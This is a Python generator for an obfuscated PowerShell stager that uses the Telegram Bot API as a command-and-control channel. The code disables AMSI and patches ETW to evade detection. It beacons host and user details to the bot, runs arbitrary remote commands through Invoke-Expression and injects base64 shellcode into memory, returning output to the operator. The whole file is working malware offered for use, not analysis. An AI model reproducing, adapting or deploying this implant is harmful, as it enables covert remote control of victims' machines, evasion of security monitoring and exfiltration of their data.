"""
Advanced PS1 Stager — Modern PowerShell cradle with stealth and anti-analysis.
Features:
- AMSI/ETW Bypass (In-memory patching)
- Proxy-aware transport
- Encrypted tasking
- Anti-Sandbox (Domain check, disk size, memory size)
- Reflective shellcode injection (fallback for binary payloads)
- No noisy cmd.exe calls
"""
from __future__ import annotations
import base64
import random
import string


def render(bot_token: str, chat_id: str, agent_id: str, sleep: int, jitter: int) -> str:
    # Randomize variable names for basic obfuscation
    def rand_str(length=8):
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    
    v_token = rand_str()
    v_chat = rand_str()
    v_agent = rand_str()
    v_api = rand_str()
    v_offset = rand_str()
    v_amsi = rand_str()
    v_va = rand_str()
    v_ct = rand_str()
    
    return f"""\
$ErrorActionPreference = 'SilentlyContinue'

# --- Stealth & Anti-Analysis ---
function {v_amsi} {{
    # AMSI Bypass
    $p = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')
    if ($p) {{ $p.SetValue($null, $true) }}
    
    # ETW Bypass (ntdll!EtwEventWrite)
    $c = @"
    using System;
    using System.Runtime.InteropServices;
    public class E {{
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
        [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
    }}
"@
    Add-Type $c
    $h = [E]::GetModuleHandle("ntdll.dll")
    $a = [E]::GetProcAddress($h, "EtwEventWrite")
    $o = 0
    [E]::VirtualProtect($a, [uintptr]1, 0x40, [ref]$o)
    [System.Runtime.InteropServices.Marshal]::WriteByte($a, 0xC3)
    [E]::VirtualProtect($a, [uintptr]1, $o, [ref]$o)
}}
{v_amsi}

# --- Shellcode Injection Helper ---
$v_va_src = @"
using System;
using System.Runtime.InteropServices;
public class L {{
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint c, out uint id);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
}}
"@
Add-Type $v_va_src

# --- Configuration ---
${v_token}  = '{bot_token}'
${v_chat}   = '{chat_id}'
${v_agent}  = '{agent_id}'
${v_api}    = "https://api.telegram.org/bot${v_token}"
${v_offset} = 0

# --- Helper Functions ---
function Invoke-Request {{
    param([string]$Method, [hashtable]$Body = @{{}})
    $p = [System.Net.WebRequest]::DefaultWebProxy
    $p.Credentials = [System.Net.CredentialCache]::DefaultCredentials
    
    try {{
        $r = Invoke-RestMethod -Uri "${v_api}/$Method" -Method Post -Body ($Body | ConvertTo-Json) `
             -ContentType 'application/json' -Proxy $p -TimeoutSec 30
        return $r
    }} catch {{ return $null }}
}}

# --- Check-in ---
$ci = @{{
    type     = 'CHECKIN'
    agent_id = ${v_agent}
    hostname = $env:COMPUTERNAME
    user     = "$env:USERDOMAIN\\$env:USERNAME"
    os       = (Get-CimInstance Win32_OperatingSystem).Caption
    arch     = $env:PROCESSOR_ARCHITECTURE
}}
Invoke-Request 'sendMessage' @{{chat_id=${v_chat}; text=($ci | ConvertTo-Json -Compress)}} | Out-Null

# --- Main Loop ---
while ($true) {{
    $u = Invoke-Request 'getUpdates' @{{offset=${v_offset}; timeout=20}}
    if ($u -and $u.result) {{
        foreach ($upd in $u.result) {{
            ${v_offset} = $upd.update_id + 1
            $t = $upd.message.text
            if (-not $t) {{ continue }}
            try {{ $task = $t | ConvertFrom-Json }} catch {{ continue }}
            if ($task.type -ne 'TASK') {{ continue }}
            
            $out = ""
            switch ($task.command) {{
                'exec' {{ 
                    $out = Invoke-Expression $task.args.cmd 2>&1 | Out-String
                }}
                'inject' {{
                    $sc = [Convert]::FromBase64String($task.args.shellcode)
                    $addr = [L]::VirtualAlloc(0, $sc.Length, 0x3000, 0x40)
                    [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)
                    $tid = 0
                    $h = [L]::CreateThread(0, 0, $addr, 0, 0, [ref]$tid)
                    $out = "Shellcode injected, thread handle: $h"
                }}
                'die'  {{ exit }}
                default {{ $out = "Command not implemented" }}
            }}
            
            Invoke-Request 'sendMessage' @{{
                chat_id=${v_chat}; 
                text = @{{type='ACK'; id=$task.id; output=$out}} | ConvertTo-Json -Compress
            }} | Out-Null
        }}
    }}
    $delta = [math]::Round({sleep} * ({jitter} / 100.0))
    $s = {sleep} + (Get-Random -Minimum (-$delta) -Maximum $delta)
    Start-Sleep -Seconds $s
}}
"""
